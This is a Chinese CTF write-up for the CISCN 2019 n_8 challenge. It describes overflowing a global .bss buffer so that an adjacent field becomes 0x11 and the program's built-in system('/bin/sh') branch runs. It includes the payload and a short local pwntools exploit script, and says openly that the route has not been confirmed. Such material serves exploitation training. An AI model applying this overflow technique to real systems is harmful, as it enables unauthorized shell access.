# CISCN 2019 N 8：覆盖全局状态触发 `system`

> 本题的利用重点是改写相邻的全局变量，不是覆盖返回地址。仓库中的 ELF 是 32 位 PIE 程序并启用栈保护；输入缓冲区位于全局区，因此这条利用路线不需要猜 PIE 地址，也不直接覆盖栈 canary。此页按本地 ELF 静态反汇编与周记截图整理，尚无本轮 GDB 复现记录。

## 程序检查逻辑

`main` 通过 `scanf` 把字符串写进 `.bss` 的全局缓冲区，之后查看紧邻的两个 32 位全局字段。若二者都为零，会走普通输出；若第一个字段为 `0x11` 且第二个为零，就会调用 `system`。

```text
全局缓冲区起点
  ├─ 前 52 字节：填充
  ├─ 后续字段 x：写入 0x11
  └─ 后续字段 y：保持为 0
                         ↓
                  system("/bin/sh")
```

这里利用的是越界字符串写入改变程序状态。反汇编中的条件等价于 `x == 0x11 && y == 0`；若条件不满足，程序打印这些字段用于调试。

## 周记里的 payload 思路

周记记录的输入是 `b'a' * 52 + p32(0x11)`。`p32` 按 i386 小端序编码整数，因此 `0x11` 写成 `11 00 00 00`。它依赖字段相对于缓冲区的偏移和输入终止方式；换样本时要从 `.bss` 变量地址与 `scanf` 的目标指针重新核对，不能只凭 `52` 这个数字。

仓库里的脚本包含远端连接配置占位值，不能直接连接；建议先在本地使用：

```python
from pwn import *

io = process('./ciscn_2019_n_8')
io.sendline(b'A' * 52 + p32(0x11))
io.interactive()
```

本地脚本应根据程序实际提示补上同步，并确认收到 shell/目标输出。当前 writeup 只把输入布局记作周记路线，尚未把占位脚本标成已运行成功。

## 复盘

- `checksec` 中有 Canary，不代表所有输入都写在栈上；先追踪输入指针。
- PIE 保护地址，但若利用只改数据并走程序已有分支，可能不需要代码地址。
- 确认 `scanf` 格式串、缓冲区边界和两个字段的真实偏移后，再判断 52 字节是否适用于当前 ELF。
